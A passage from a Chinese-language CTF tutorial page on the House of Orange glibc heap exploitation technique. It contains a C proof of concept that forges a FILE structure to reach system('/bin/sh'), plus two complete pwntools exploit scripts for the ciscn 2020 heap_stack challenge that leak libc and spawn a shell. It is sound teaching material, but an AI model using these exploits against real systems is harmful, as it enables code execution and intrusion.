<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">winner</span> <span class="hljs-params">( <span class="hljs-keyword">char</span> *ptr)</span></span>;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">char</span> *p1, *p2;
    <span class="hljs-keyword">size_t</span> io_list_all, *top;
    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span><span class="hljs-number">-16</span>);
    top = (<span class="hljs-keyword">size_t</span> *) ( (<span class="hljs-keyword">char</span> *) p1 + <span class="hljs-number">0x400</span> - <span class="hljs-number">16</span>);
    top[<span class="hljs-number">1</span>] = <span class="hljs-number">0xc01</span>;
    p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);
    io_list_all = top[<span class="hljs-number">2</span>] + <span class="hljs-number">0x9a8</span>;  <span class="hljs-comment">//get real addr of io_list_all</span>
    top[<span class="hljs-number">3</span>] = io_list_all - <span class="hljs-number">0x10</span>;  <span class="hljs-comment">//unsorted bin-&gt;bk = io_list_all - 0x10</span>
    <span class="hljs-built_in">memcpy</span>( ( <span class="hljs-keyword">char</span> *) top, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>, <span class="hljs-number">8</span>); <span class="hljs-comment">//fake_file-&gt;_flags</span>
    top[<span class="hljs-number">1</span>] = <span class="hljs-number">0x61</span>;  <span class="hljs-comment">//fake_size</span>
    FILE *fp = (FILE *) top;  
    fp-&gt;_mode = <span class="hljs-number">0</span>; <span class="hljs-comment">// top+0xc0</span>
    fp-&gt;_IO_write_base = (<span class="hljs-keyword">char</span> *) <span class="hljs-number">2</span>; <span class="hljs-comment">// top+0x20</span>
    fp-&gt;_IO_write_ptr = (<span class="hljs-keyword">char</span> *) <span class="hljs-number">3</span>; <span class="hljs-comment">// top+0x28</span>
    <span class="hljs-keyword">size_t</span> *jump_table = &amp;top[<span class="hljs-number">12</span>]; <span class="hljs-comment">// controlled memory</span>
    jump_table[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">size_t</span>) &amp;winner;
    *(<span class="hljs-keyword">size_t</span> *) ((<span class="hljs-keyword">size_t</span>) fp + <span class="hljs-keyword">sizeof</span>(FILE)) = (<span class="hljs-keyword">size_t</span>) jump_table; <span class="hljs-comment">// top+0xd8</span>
    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">winner</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *ptr)</span>
</span>{ 
    system(ptr);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>&#x6267;&#x884C;malloc(10)&#x524D;&#xFF0C;&#x5BF9;unsorted bin&#x7684;&#x4F2A;&#x9020;</p>
<p><img src="4.png" alt=""></p>
<p>&#x6CE8;&#xFF1A;&#x8FD9;&#x91CC;fake_size&#x4E3A;0x61&#x662F;&#x56E0;&#x4E3A;_chain&#x5728;FILE&#x7ED3;&#x6784;&#x4F53;&#x4E2D;&#x504F;&#x79FB;&#x91CF;&#x662F;0x68</p>
<p><strong>&#x8865;&#x5145;&#xFF1A;GDB&#x63D0;&#x4F9B;&#x4E86;&#x683C;&#x5F0F;&#x5316;&#x8F93;&#x51FA;&#x663E;&#x793A;&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x9009;&#x9879;&#xFF0C;set print pretty off&#xFF0C; &#x8FD9;&#x4E2A;&#x9009;&#x9879;&#x7684;&#x9ED8;&#x8BA4;&#x662F;&#x5173;&#x95ED;&#x7684;&#x3002;&#x6253;&#x5F00;&#x8BE5;&#x9009;&#x9879;set print pretty on&#x518D;&#x6B21;&#x6253;&#x5370;&#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A;&#x6211;TM&#x76F4;&#x63A5;&#x5C31;&#x5FEB;&#x4E50;&#x4E86;</strong></p>
<p><img src="5.png" alt=""></p>
<p>&#x6267;&#x884C;malloc(10)&#x540E;_IO_list_all&#x6307;&#x5411;&#x4E86;unsorted bin&#x5934;&#x8282;&#x70B9;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x6B64;&#x65F6;smallbin[4]&#x91CC;&#x653E;&#x7684;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x9B54;&#x6539;&#x8FC7;&#x7684;&#x88AB;&#x653E;&#x5165;unsorted bin&#x7684;chunk&#x4E86;&#xFF0C;&#x5E76;&#x4E14;&#x6B63;&#x597D;&#x504F;&#x79FB;&#x91CF;0x60&#xFF0C;&#x8FD9;&#x4E5F;&#x5C31;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x4F2A;&#x9020;fake_size&#x4E3A;0x61&#x3002;</p>
<p><img src="5.jpg" alt=""></p>
<p>malloc(10)&#x7684;&#x8FC7;&#x7A0B;&#xFF1A;&#x4F2A;&#x9020;&#x7684;unsorted bin&#x8131;&#x94FE;&#x8FDB;&#x5165;&#x5BF9;&#x5E94;&#x7684;small bin&#xFF0C;&#x5E76;&#x4E14;&#x901A;&#x8FC7;unsorted bin attack&#x4F7F;_IO_list_all&#x6307;&#x5411;&#x4E86;unsorted bin&#x7684;&#x5934;&#x7ED3;&#x70B9;========&gt;&#x7A0B;&#x5E8F;&#x5F02;&#x5E38;========&gt;&#x8FDB;&#x884C;_IO_flush_all_lockp========&gt;&#x7B2C;&#x4E00;&#x4E2A;FILE&#x7ED3;&#x6784;_mode&#x5F02;&#x5E38;&#x672A;&#x80FD;&#x89E6;&#x53D1;_IO_OVERFLOW========&gt;&#x904D;&#x5386;&#x5230;&#x7B2C;&#x4E8C;&#x4E2A;FILE&#x7ED3;&#x6784;&#x6210;&#x529F;&#x89E6;&#x53D1;&#x5229;&#x7528;&#x3002;</p>
<p><strong>&#x6CE8;&#xFF1A;&#x8FD9;&#x91CC;&#x7684;&#x89E6;&#x53D1;&#x5177;&#x6709;&#x4E00;&#x5B9A;&#x6982;&#x7387;&#xFF0C;1/2&#x7684;&#x53EF;&#x80FD;&#x6027;&#xFF0C;&#x5177;&#x4F53;1/2&#x5982;&#x4F55;&#x5F97;&#x51FA;&#x5C1A;&#x5F85;&#x8003;&#x8BC1;&#x3002;&#x8FD9;&#x91CC;&#x7ED9;&#x51FA;angelboy&#x7684;&#x4E00;&#x5F20;&#x622A;&#x56FE;&#x3002;</strong></p>
<p><img src="6.png" alt=""></p>
<p>&#x6700;&#x540E;&#x89E6;&#x53D1;system(&quot;/bin/sh&quot;)&#x7684;&#x6D41;&#x7A0B;</p>
<pre><code>__libc_malloc =&gt; malloc_printerr =&gt; __libc_message =&gt; abort =&gt; _IO_flush_all_lockp
</code></pre><p>&#x6808;&#x56DE;&#x6EAF;</p>
<p><img src="7.png" alt=""></p>
<p>&#x6548;&#x679C;&#x56FE;&#xFF1A;&#x7A0B;&#x5E8F;&#x6253;&#x5370;&#x5F02;&#x5E38;&#x540E;&#x6210;&#x529F;getshell</p>
<p><img src="8.png" alt=""></p>
<h4 id="&#x4F8B;1-ciscn-2020-&#x534E;&#x4E1C;&#x5317;&#x5206;&#x533A;&#x8D5B;-heapstack">&#x4F8B;1 ciscn 2020 &#x534E;&#x4E1C;&#x5317;&#x5206;&#x533A;&#x8D5B; heap_stack</h4>
<p>&#x6700;&#x7ECF;&#x5178;&#x7684;&#x4F8B;&#x9898;&#x5C31;&#x662F; hitcon-2016-houseoforange&#xFF0C;&#x4F46;&#x611F;&#x89C9;&#x90A3;&#x4E2A;&#x7A0D;&#x5FAE;&#x590D;&#x6742;&#x4E00;&#x70B9;&#xFF0C;&#x6709;&#x4E00;&#x4E9B;&#x522B;&#x7684;&#x4E1C;&#x897F;&#x53C2;&#x6742;&#x5728;&#x91CC;&#x9762;&#xFF0C;&#x8FD9;&#x9053;heap_stack&#x76F8;&#x5BF9;&#x6765;&#x8BF4;&#x4F5C;&#x4E3A;&#x4F8B;&#x9898;&#x6765;&#x770B;&#x66F4;&#x52A0;&#x6E05;&#x695A;&#x3002;</p>
<p>&#x4FDD;&#x62A4;&#x673A;&#x5236;</p>
<p><img src="9.png" alt=""></p>
<p>main&#x51FD;&#x6570;&#x903B;&#x8F91;&#xFF0C;&#x601D;&#x8DEF;&#x6BD4;&#x8F83;&#x6E05;&#x6670;&#xFF0C;&#x6CA1;&#x6709;free&#x51FD;&#x6570;</p>
<pre><code class="lang-c"><span class="hljs-keyword">void</span> __<span class="hljs-function">fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span>
</span>{
  init_clear();
  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;######## HEAPSTACK ########&quot;</span>);
  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )
  {
    menu();
    getNum();
    <span class="hljs-keyword">switch</span> ( choice )
    {
      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:
        push();
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:
        puuuuuush();
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:
        pop();
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:
        show();
        <span class="hljs-keyword">break</span>;
      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
        <span class="hljs-keyword">return</span>;
      <span class="hljs-keyword">default</span>:
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bad choice!\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    }
  }
}
</code></pre>
<p>push&#x51FD;&#x6570;</p>
<pre><code class="lang-c"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">push</span><span class="hljs-params">()</span>
</span>{
  __int64 nbytes; <span class="hljs-comment">// ST00_8</span>
  <span class="hljs-keyword">size_t</span> size; <span class="hljs-comment">// ST08_8</span>
  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// ST10_8</span>
  <span class="hljs-keyword">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>

  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);
  <span class="hljs-keyword">if</span> ( note_num[<span class="hljs-number">0</span>] &lt;= <span class="hljs-number">9</span> )
  {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;size?&quot;</span>);
    nbytes = getNum();
    size = nbytes &amp; <span class="hljs-number">0xFFF</span>;
    buf = <span class="hljs-built_in">malloc</span>(size);
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;content?&quot;</span>);
    read(<span class="hljs-number">0</span>, buf, nbytes);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Malloc at  %p.\n&quot;</span>, buf, nbytes, size);
    notes[note_num[<span class="hljs-number">0</span>]] = buf;
    ++note_num[<span class="hljs-number">0</span>];
  }
  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;
}
</code></pre>
<p>puuuuuush&#x51FD;&#x6570;</p>
<pre><code class="lang-c"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">puuuuuush</span><span class="hljs-params">()</span>
</span>{
  __int64 size; <span class="hljs-comment">// ST08_8</span>
  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// ST10_8</span>
  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>

  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);
  <span class="hljs-keyword">if</span> ( puuuuuush_time &amp;&amp; note_num[<span class="hljs-number">0</span>] &lt;= <span class="hljs-number">9</span> )
  {
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;size?&quot;</span>);
    size = getNum();
    buf = <span class="hljs-built_in">malloc</span>(size);
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;content?&quot;</span>);
    read(<span class="hljs-number">0</span>, buf, size);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Malloc at  %p.\n&quot;</span>, buf, size, size);
    notes[note_num[<span class="hljs-number">0</span>]] = buf;
    ++note_num[<span class="hljs-number">0</span>];
    --puuuuuush_time;
  }
  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;
}
</code></pre>
<p>pop&#x51FD;&#x6570;</p>
<pre><code class="lang-c"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">pop</span><span class="hljs-params">()</span>
</span>{
  <span class="hljs-keyword">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span>

  v1 = __readfsqword(<span class="hljs-number">0x28</span>u);
  <span class="hljs-keyword">if</span> ( note_num[<span class="hljs-number">0</span>] )
    --note_num[<span class="hljs-number">0</span>];
  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v1;
}
</code></pre>
<p>show&#x51FD;&#x6570;</p>
<pre><code class="lang-c"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">show</span><span class="hljs-params">()</span>
</span>{
  <span class="hljs-keyword">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span>

  v1 = __readfsqword(<span class="hljs-number">0x28</span>u);
  <span class="hljs-keyword">if</span> ( show_time )
  {
    write(<span class="hljs-number">1</span>, notes[note_num[<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>], <span class="hljs-number">8u</span>LL);
    --show_time;
  }
  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v1;
}
</code></pre>
<ul>
<li>push&#x51FD;&#x6570;&#x5B58;&#x5728;&#x5806;&#x6EA2;&#x51FA;&#x95EE;&#x9898;&#x7533;&#x8BF7;0x1010&#x7684;&#x5806;&#xFF0C;&#x5B9E;&#x9645;&#x5F97;&#x5230;0x20&#x5927;&#x5C0F;&#x7684;chunk&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x5199;&#x5165;0x1010&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x5E76;&#x4E14;&#x5B83;&#x6CC4;&#x9732;&#x4E86;&#x5806;&#x5730;&#x5740;</li>
<li>puuuuuush&#x51FD;&#x6570;&#x5C5E;&#x4E8E;&#x4E0D;&#x5B58;&#x5728;&#x6EA2;&#x51FA;&#x7684;&#x58F0;&#x8BF7;&#xFF0C;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x58F0;&#x8BF7;&#x5927;&#x5C0F;&gt;0x1000&#x7684;chunk</li>
<li>pop&#x51FD;&#x6570;&#x662F;&#x662F;&#x76F4;&#x63A5;&#x5B9E;&#x73B0;note_num--</li>
<li>show&#x51FD;&#x6570;&#x53EA;&#x80FD;&#x7528;&#x4E00;&#x6B21;&#xFF0C;&#x90A3;&#x4E48;&#x5FC5;&#x7136;&#x662F;&#x6CC4;&#x9732;libcbase&#x7528;</li>
</ul>
<p>&#x8FD9;&#x91CC;&#x601D;&#x8DEF;&#x76F8;&#x5BF9;&#x7B80;&#x5355;&#xFF0C;&#x76F4;&#x63A5;&#x7ED9;&#x51FA;exp</p>
<pre><code class="lang-c">from pwn import *
context.update(arch=&apos;amd64&apos;,os=&apos;linux&apos;,timeout=1)
context.log_level=&apos;debug&apos;
libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)
def push1(size,content):
    p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;1&apos;)
    p.sendlineafter(&apos;size?&apos;,str(size))
    p.sendafter(&apos;content?&apos;,content)    
def push2(size,content):
    p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;2&apos;)
    p.sendlineafter(&apos;size?&apos;,str(size))
    p.sendafter(&apos;content?&apos;,content)    
def pop():
    p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;3&apos;)
def show():
    p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;4&apos;)

def pr(a,addr):
    log.success(a+&apos;===&gt;&apos;+hex(addr))

def hack():
    push1(0x1010,&apos;\x00&apos;*0x18+p64(0xfe1))
    p.recvuntil(&apos;Malloc at  &apos;)
    heapbase = int(p.recvuntil(&apos;.&apos;)[:-1],16) - 0x10
    push2(0x2000,&apos;\x00&apos;)
    push1(0x10,&apos;\x78&apos;)
    show()
    leak = u64(p.recv(8))
    libcbase =  leak - (0x7fbec8029178 - 0x7fbec7c64000)
    _IO_list_all = libcbase + libc.sym[&apos;_IO_list_all&apos;]
    system = libcbase + libc.sym[&apos;system&apos;]
    pr(&apos;heapbase&apos;,heapbase)
    pr(&apos;libcbase&apos;,libcbase)
    pr(&apos;_IO_list_all&apos;,_IO_list_all)
    pr(&apos;system&apos;,system)

    fake_vtable_addr = heapbase + 0x60 + 0xd8 + 8
    unsortedbin = &apos;\x00&apos;*0x10 + &apos;/bin/sh\x00&apos;+p64(0x61)
    unsortedbin += p64(0xdeadbeef) + p64(_IO_list_all - 0x10)
    unsortedbin += p64(0) + p64(1)
    unsortedbin = unsortedbin.ljust(0x10+0xd8,&apos;\x00&apos;) + p64(fake_vtable_addr)
    fake_vtable = p64(0)*3 + p64(system)
    payload = unsortedbin + fake_vtable

    push1(0x1010,payload)
    p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;1&apos;)
    p.sendlineafter(&apos;size?&apos;,&apos;16&apos;)

    #gdb.attach(p)
    p.interactive()

while True:
    try:
        global p
        p = process(&apos;./heap_stack&apos;)
        hack()
        #break

    except:
        p.close()
        print &apos;trying...&apos;
</code></pre>
<p>&#x53E6;&#x5916;&#x4E00;&#x79CD;&#x601D;&#x8DEF; house of lore + house of force</p>
<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/python</span>
<span class="hljs-comment">#coding:utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.log_level=<span class="hljs-string">&apos;debug&apos;</span>
context.update(arch=<span class="hljs-string">&apos;amd64&apos;</span>,os=<span class="hljs-string">&apos;linux&apos;</span>,timeout=<span class="hljs-number">1</span>)
io=process(<span class="hljs-string">&quot;./heap_stack&quot;</span>)
libc = ELF(<span class="hljs-string">&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">push</span><span class="hljs-params">(size,ct=<span class="hljs-string">&apos;a&apos;</span>)</span>:</span>
    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&apos;1&apos;</span>)
    io.sendlineafter(<span class="hljs-string">&quot;size?\n&quot;</span>,str(size))
    io.sendafter(<span class="hljs-string">&quot;content?\n&quot;</span>,ct)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">puush</span><span class="hljs-params">(size,ct=<span class="hljs-string">&apos;a&apos;</span>)</span>:</span><span class="hljs-comment">#1</span>
    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&apos;2&apos;</span>)
    io.sendlineafter(<span class="hljs-string">&quot;size?\n&quot;</span>,str(size))
    io.sendlineafter(<span class="hljs-string">&quot;content?\n&quot;</span>,ct)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span>:</span>
    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&apos;3&apos;</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span><span class="hljs-comment">#1</span>
    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&apos;4&apos;</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    push(<span class="hljs-number">0x1010</span>,<span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xfe1</span>))
    push(<span class="hljs-number">0xfe0</span>)
    push(<span class="hljs-number">0x1fb0</span>)
    show()
    libc_base=u64(io.recv(<span class="hljs-number">8</span>))<span class="hljs-number">-0x3c5161</span>+<span class="hljs-number">0x600</span>
    log.success(<span class="hljs-string">&quot;libc_base==&gt;&quot;</span>+hex(libc_base))
    push(<span class="hljs-number">0x1010</span>,<span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>))
    io.recvuntil(<span class="hljs-string">&quot;at  &quot;</span>)
    top_chunk=int(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)+<span class="hljs-number">0x10</span>
    log.success(<span class="hljs-string">&quot;top_chunk==&gt;&quot;</span>+hex(top_chunk))
    malloc_hook=libc_base+<span class="hljs-number">0x3c4b10</span>
    realloc=libc_base+<span class="hljs-number">0x84710</span>
    ogg=libc_base+[<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf0364</span>,<span class="hljs-number">0xf1207</span>][<span class="hljs-number">1</span>]
    log.success(<span class="hljs-string">&quot;realloc==&gt;&quot;</span>+hex(realloc))
    puush(malloc_hook - top_chunk <span class="hljs-number">-0x30</span>)
    push(<span class="hljs-number">0x20</span>,p64(<span class="hljs-number">0</span>)+p64(ogg)+p64(realloc+<span class="hljs-number">4</span>))
    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&apos;1&apos;</span>)
    io.sendlineafter(<span class="hljs-string">&quot;size?\n&quot;</span>,str(<span class="hljs-number">0x10</span>))
    <span class="hljs-comment">#gdb.attach(io,&apos;b *{}&apos;.format(ogg))</span>
    io.interactive()
<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&apos;__main__&apos;</span>:
    main()
</code></pre>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="../House_of_lore/House_of_lore.html" class="navigation navigation-prev " aria-label="Previous page: House_of_lore">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="../House_of_storm/House_of_storm.html" class="navigation navigation-next " aria-label="Next page: House_of_storm">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"House_of_Orange","level":"1.2.4.5","depth":3,"next":{"title":"House_of_storm","level":"1.2.4.6","depth":3,"path":"pwn/heap_related/House_of_storm/House_of_storm.md","ref":"pwn/heap_related/House_of_storm/House_of_storm.md","articles":[]},"previous":{"title":"House_of_lore","level":"1.2.4.4","depth":3,"path":"pwn/heap_related/House_of_lore/House_of_lore.md","ref":"pwn/heap_related/House_of_lore/House_of_lore.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-sharing","sharing-plus","-search","search-pro","code","expandable-chapters","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"search-pro":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","qq","linkedin","qzone","douban"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"TTY","lang":"zh-cn","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Gitbook电子书","gitbook":"*","description":"Gitbook电子书示例项目"},"file":{"path":"pwn/heap_related/House_of_Orange/House_of_Orange.md","mtime":"2021-04-19T13:34:16.000Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-12-04T09:49:46.732Z"},"basePath":"../../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../../gitbook/gitbook.js"></script>
    <script src="../../../gitbook/theme.js"></script>
    
        
        <script src="../../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-search-pro/search.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-code/plugin.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

